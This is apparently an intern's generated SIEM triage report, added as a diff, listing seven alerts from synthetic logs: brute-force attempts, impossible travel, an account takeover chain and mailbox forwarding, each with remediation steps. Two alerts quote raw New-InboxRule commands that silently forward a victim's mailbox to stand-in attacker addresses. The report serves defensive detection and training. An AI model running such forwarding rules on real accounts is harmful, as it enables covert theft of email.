@@ -1,0 +1,60 @@
+================================================================================
+        SQROCK IT SOLUTIONS - SIEM SECURITY INCIDENT TRIAGE SUMMARY
+================================================================================
+Generated At       : 2026-11-07T19:37:27.992104
+Analyzed Log Path  : C:\Users\PERSONAL\Desktop\Internship Sqrock\Day13_SIEM_Log_Analysis\logs\security_events.log
+Total Log Events   : 25
+Total Threat Alerts: 7
+Critical Severity  : 4
+High Severity      : 3
+--------------------------------------------------------------------------------
+
+[ALERT #01] Unauthorized Mailbox Auto-Forwarding Rule Created (Exfiltration Tripwire) [CRITICAL]
+  Alert ID        : ALRT-EXCH-081824
+  MITRE Technique : T1114.003 (Collection / Exfiltration)
+  Affected Entity : Mailbox: j.smith@sqrock-solutions.com
+  Details         : {"mailbox": "j.smith@sqrock-solutions.com", "forward_destination": "attacker-drop@proton.me", "cmdlet": "New-InboxRule", "timestamp": "2026-11-07 08:18:24", "raw_command": "-Name \"AutoArchive\" -Mailbox \"j.smith@sqrock-solutions.com\" -ForwardTo \"attacker-drop@proton.me\" -DeleteMessage $true rule=forward_all"}
+  Remediation     : Immediately remove forwarding rule from j.smith@sqrock-solutions.com, invalidate active OAuth tokens, and reset account credentials.
+--------------------------------------------------------------------------------
+[ALERT #02] Unauthorized Mailbox Auto-Forwarding Rule Created (Exfiltration Tripwire) [CRITICAL]
+  Alert ID        : ALRT-EXCH-094205
+  MITRE Technique : T1114.003 (Collection / Exfiltration)
+  Affected Entity : Mailbox: m.siddiqui@sqrock-solutions.com
+  Details         : {"mailbox": "m.siddiqui@sqrock-solutions.com", "forward_destination": "shadow-recon@darknet.org", "cmdlet": "New-InboxRule", "timestamp": "2026-11-07 09:42:05", "raw_command": "-Name \"ExfilFilter\" -Mailbox \"m.siddiqui@sqrock-solutions.com\" -ForwardTo \"shadow-recon@darknet.org\" rule=forward_all"}
+  Remediation     : Immediately remove forwarding rule from m.siddiqui@sqrock-solutions.com, invalidate active OAuth tokens, and reset account credentials.
+--------------------------------------------------------------------------------
+[ALERT #03] Anomalous Authentication Velocity (Impossible Travel Detected) [CRITICAL]
+  Alert ID        : ALRT-TRAVEL-m_siddiqui
+  MITRE Technique : T1078.004 (Defense Evasion / Initial Access)
+  Affected Entity : User: m.siddiqui
+  Details         : {"user": "m.siddiqui", "location_1": "New York, US (198.51.100.99)", "location_2": "Tokyo, JP (203.0.113.190)", "distance_km": 10851.73, "time_delta_minutes": 35.42, "calculated_velocity_kmh": 18384.11, "threshold_kmh": 800.0}
+  Remediation     : Terminate active sessions for m.siddiqui, require MFA challenge re-authentication, and isolate external IP 203.0.113.190.
+--------------------------------------------------------------------------------
+[ALERT #04] Full Multi-Stage Account Takeover (ATO) Chain Identified [CRITICAL]
+  Alert ID        : ALRT-ATO-j.smith
+  MITRE Technique : T1078 / T1110 / T1114.003 (Credential Access -> Persistence -> Exfiltration)
+  Affected Entity : Compromised Identity: j.smith
+  Details         : {"user": "j.smith", "attack_stage_1": "5 failed password attempts from 198.51.100.42", "attack_stage_2": "Successful authentication at 2026-11-07 08:16:11 from 198.51.100.42", "attack_stage_3": "Malicious forwarding rule created to attacker-drop@proton.me", "compromise_window": "2026-11-07 08:14:02 to 2026-11-07 08:18:24"}
+  Remediation     : TRIGGER INCIDENT RESPONSE P1: Immediately lock account j.smith, purge inbox rules, revoke VPN tokens, and blacklist source IP.
+--------------------------------------------------------------------------------
+[ALERT #05] Multiple Failed Authentication Attempts (Brute Force / Password Spray) [HIGH]
+  Alert ID        : ALRT-BF-198_51_100_42
+  MITRE Technique : T1110.001 (Credential Access)
+  Affected Entity : Source IP: 198.51.100.42
+  Details         : {"attacker_ip": "198.51.100.42", "failed_attempts": 5, "targeted_users": ["j.smith"], "time_span_seconds": 93.0, "first_seen": "2026-11-07 08:14:02", "last_seen": "2026-11-07 08:15:35"}
+  Remediation     : Enforce immediate IP block on firewall for 198.51.100.42 and enforce account lockout threshold.
+--------------------------------------------------------------------------------
+[ALERT #06] Multiple Failed Authentication Attempts (Brute Force / Password Spray) [HIGH]
+  Alert ID        : ALRT-BF-203_0_113_88
+  MITRE Technique : T1110.001 (Credential Access)
+  Affected Entity : Source IP: 203.0.113.88
+  Details         : {"attacker_ip": "203.0.113.88", "failed_attempts": 4, "targeted_users": ["service_sql", "administrator", "root", "admin"], "time_span_seconds": 15.0, "first_seen": "2026-11-07 08:45:10", "last_seen": "2026-11-07 08:45:25"}
+  Remediation     : Enforce immediate IP block on firewall for 203.0.113.88 and enforce account lockout threshold.
+--------------------------------------------------------------------------------
+[ALERT #07] Multiple Failed Authentication Attempts (Brute Force / Password Spray) [HIGH]
+  Alert ID        : ALRT-BF-192_0_2_11
+  MITRE Technique : T1110.001 (Credential Access)
+  Affected Entity : Source IP: 192.0.2.11
+  Details         : {"attacker_ip": "192.0.2.11", "failed_attempts": 3, "targeted_users": ["l.skywalker"], "time_span_seconds": 11.0, "first_seen": "2026-11-07 10:02:18", "last_seen": "2026-11-07 10:02:29"}
+  Remediation     : Enforce immediate IP block on firewall for 192.0.2.11 and enforce account lockout threshold.
+--------------------------------------------------------------------------------
